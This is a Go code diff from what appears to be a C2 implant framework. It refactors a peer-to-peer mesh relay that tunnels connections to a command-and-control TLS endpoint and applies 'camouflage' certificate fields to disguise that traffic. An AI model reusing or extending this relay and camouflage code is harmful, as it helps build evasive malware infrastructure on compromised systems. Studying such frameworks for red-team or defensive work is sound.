@@ -32,64 +32,76 @@ const (
 	bridgeDialTimeout = 10 * time.Second
 )
 
-// DialGateway opens a KCP connection to the Gateway IP, sends the specified opcode,
-// and returns a net.Conn. If opcode is OpcodeConnectC2, the conn is transparently
-// piped to the real C2 TLS endpoint.
-func DialGateway(ctx context.Context, gatewayIP string, opcode byte) (net.Conn, error) {
-	kcpPort := common.RuntimeConfig.P2PRelayPort
-	addr := fmt.Sprintf("%s:%s", gatewayIP, kcpPort)
-
-	var kcpConn net.Conn
-	var err error
-
-	t := transport.GetTransportImplementation(common.RuntimeConfig.P2PTransport)
-	if camo, ok := t.(*transport.CamouflageMTLS); ok {
-		camo.CertOrg = common.RuntimeConfig.CamouflageCertOrg
-		camo.CertCN = common.RuntimeConfig.CamouflageCertCN
+// DialGatewayPeer opens a connection to a peer's relay using the transport the
+// peer advertised in gossip, sends the specified opcode, and returns a net.Conn.
+// If opcode is OpcodeConnectC2, the conn is transparently piped to the real C2
+// TLS endpoint.
+func DialGatewayPeer(ctx context.Context, peer def.MeshNodeMeta, opcode byte) (net.Conn, error) {
+	fallbackPort := 0
+	if p, err := strconv.Atoi(common.RuntimeConfig.P2PRelayPort); err == nil {
+		fallbackPort = p
 	}
-	logging.Debugf("Mesh: dialing Gateway %s relay at %s", common.RuntimeConfig.P2PTransport, addr)
-	kcpConn, err = t.Dial(addr, common.RuntimeConfig.Password, def.MagicString)
+	ep := transport.PeerEndpoint{
+		Addr:      peer.Addr,
+		Port:      peer.P2PPort,
+		Transport: peer.P2PTransport,
+	}
+	if ep.Addr == "" {
+		return nil, fmt.Errorf("DialGatewayPeer: empty peer address")
+	}
+
+	relayConn, err := transport.DialPeer(
+		ep,
+		common.RuntimeConfig.P2PTransport,
+		fallbackPort,
+		common.RuntimeConfig.Password,
+		def.MagicString,
+	)
 	if err != nil {
-		return nil, fmt.Errorf("DialGateway %s: %v", addr, err)
+		return nil, fmt.Errorf("DialGatewayPeer: %w", err)
 	}
 
 	// Send opcode
-	if _, err = kcpConn.Write([]byte{opcode}); err != nil {
-		kcpConn.Close()
+	if _, err = relayConn.Write([]byte{opcode}); err != nil {
+		relayConn.Close()
 		return nil, fmt.Errorf("DialGateway send opcode: %v", err)
 	}
 
 	// Read response
 	resp := make([]byte, 1)
-	kcpConn.SetDeadline(time.Now().Add(bridgeDialTimeout))
-	if _, err = io.ReadFull(kcpConn, resp); err != nil {
-		kcpConn.Close()
+	relayConn.SetDeadline(time.Now().Add(bridgeDialTimeout))
+	if _, err = io.ReadFull(relayConn, resp); err != nil {
+		relayConn.Close()
 		return nil, fmt.Errorf("DialGateway read response: %v", err)
 	}
-	kcpConn.SetDeadline(time.Time{}) // clear deadline
+	relayConn.SetDeadline(time.Time{}) // clear deadline
 
 	switch resp[0] {
 	case OpcodeOK:
 		logging.Debugf("Mesh: Gateway accepted relay, C2 tunnel established")
-		return kcpConn, nil
+		return relayConn, nil
 	case OpcodeErr:
 		// Read 2-byte LE error length then message
 		lenBuf := make([]byte, 2)
-		io.ReadFull(kcpConn, lenBuf)
+		io.ReadFull(relayConn, lenBuf)
 		errLen := binary.LittleEndian.Uint16(lenBuf)
 		msg := make([]byte, errLen)
-		io.ReadFull(kcpConn, msg)
-		kcpConn.Close()
+		io.ReadFull(relayConn, msg)
+		relayConn.Close()
 		return nil, fmt.Errorf("DialGateway: gateway refused: %s", string(msg))
 	default:
-		kcpConn.Close()
+		relayConn.Close()
 		return nil, fmt.Errorf("DialGateway: unexpected opcode 0x%02x", resp[0])
 	}
 }
 
 // ServeRelay accepts incoming P2P connections from peers (relaying C2 traffic or serving files).
 func ServeRelay(ctx context.Context) {
-	t := transport.GetTransportImplementation(common.RuntimeConfig.P2PTransport)
+	t, err := transport.UsableTransport(common.RuntimeConfig.P2PTransport)
+	if err != nil {
+		logging.Errorf("Mesh ServeRelay: %v — P2P relay disabled", err)
+		return
+	}
 	if camo, ok := t.(*transport.CamouflageMTLS); ok {
 		camo.CertOrg = common.RuntimeConfig.CamouflageCertOrg
 		camo.CertCN = common.RuntimeConfig.CamouflageCertCN
